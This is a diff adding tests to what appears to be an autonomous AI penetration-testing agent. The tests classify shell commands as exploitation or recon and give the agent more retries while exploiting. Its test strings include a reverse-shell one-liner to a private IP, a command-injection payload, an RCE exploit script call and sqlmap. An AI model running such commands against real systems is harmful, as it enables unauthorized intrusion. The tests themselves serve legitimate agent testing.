@@ -4090,6 +4090,68 @@ async def test_stuck_recovery_budget_gives_multiple_recoveries_before_pausing(tm
         await task
 
 
+def test_is_exploitation_iteration_distinguishes_exploit_from_recon():
+    from mist.core.agent import _is_exploitation_iteration
+    # exploitation: crafted POST body, web/reverse-shell payloads, sqli, exploit scripts
+    assert _is_exploitation_iteration("curl -s -X POST http://x/exploit -d 'p=1'")
+    assert _is_exploitation_iteration("curl http://x/?cmd=id -d 'x=system(\"whoami\")'")
+    assert _is_exploitation_iteration("python3 craft_cms_rce_51918.py http://orion.htb")
+    assert _is_exploitation_iteration("bash -i >& /dev/tcp/10.10.14.9/4444 0>&1")
+    assert _is_exploitation_iteration("sqlmap -u http://x/item?id=1 --batch")
+    # recon path-guessing: bare GETs to varied paths — NOT exploitation
+    assert not _is_exploitation_iteration("curl -s http://x/admin/login")
+    assert not _is_exploitation_iteration("curl -s http://x/api/v1/reports")
+    assert not _is_exploitation_iteration("gobuster dir -u http://x -w common.txt")
+
+
+async def test_exploitation_iteration_gets_more_guard_rope_than_recon(tmp_path):
+    # 5 different-payload POSTs to one endpoint = productive exploit iteration —
+    # with the multiplier it must NOT pause where recon path-guessing would.
+    posts = [json.dumps({"action": "use_tool", "tool": "shell",
+             "arguments": {"command": f"curl -s -X POST http://x.htb/exploit -d 'payload={i}'"}})
+             for i in range(5)]
+    agent = make_mission_agent(tmp_path, posts + [
+        json.dumps({"action": "use_tool", "tool": "finish_objective", "arguments": {"summary": "shell"}}),
+        json.dumps({"action": "respond"}),
+    ])
+    agent.cfg.mission.manual_probe_threshold = 2      # base would flag at 2 curls...
+    agent.cfg.mission.near_duplicate_threshold = 2
+    agent.cfg.mission.exploitation_guard_multiplier = 3  # ...exploitation gets 2*3=6 rope
+    control = MissionControl()
+    events = [e async for e in agent.astream_mission("get a shell", control, max_turns=10)]
+    kinds = [e.kind for e in events]
+    assert "stuck" not in kinds and "recovering" not in kinds  # not flagged as a loop
+    assert "finished" in kinds                                  # ran the whole iteration
+
+
+async def test_recon_path_guessing_still_flagged_at_base_threshold(tmp_path):
+    # Contrast: the SAME count of bare GET path-guesses (recon, not exploitation)
+    # DOES trip the manual-probe guard at the base threshold — loosening is
+    # exploitation-only.
+    gets = [json.dumps({"action": "use_tool", "tool": "shell",
+            "arguments": {"command": f"curl -s http://x.htb/guess{i}"}}) for i in range(6)]
+    agent = make_mission_agent(tmp_path, gets)
+    agent.cfg.mission.manual_probe_threshold = 2
+    agent.cfg.mission.exploitation_guard_multiplier = 3
+    control = MissionControl()
+    events: list = []
+
+    async def drive():
+        async for ev in agent.astream_mission("enumerate", control, max_turns=10):
+            events.append(ev)
+
+    task = asyncio.create_task(drive())
+    for _ in range(500):
+        if any(e.kind in ("recovering", "stuck") for e in events):
+            break
+        await asyncio.sleep(0.01)
+    assert any(e.kind in ("recovering", "stuck") for e in events)  # recon path-guessing flagged
+
+    task.cancel()
+    with pytest.raises(asyncio.CancelledError):
+        await task
+
+
 async def test_mission_redirects_shell_workspace_to_target_directory(tmp_path, monkeypatch):
     # Confirms the structural fix end-to-end: the shell's cwd actually gets
     # redirected to a per-target folder at mission start (not left in one
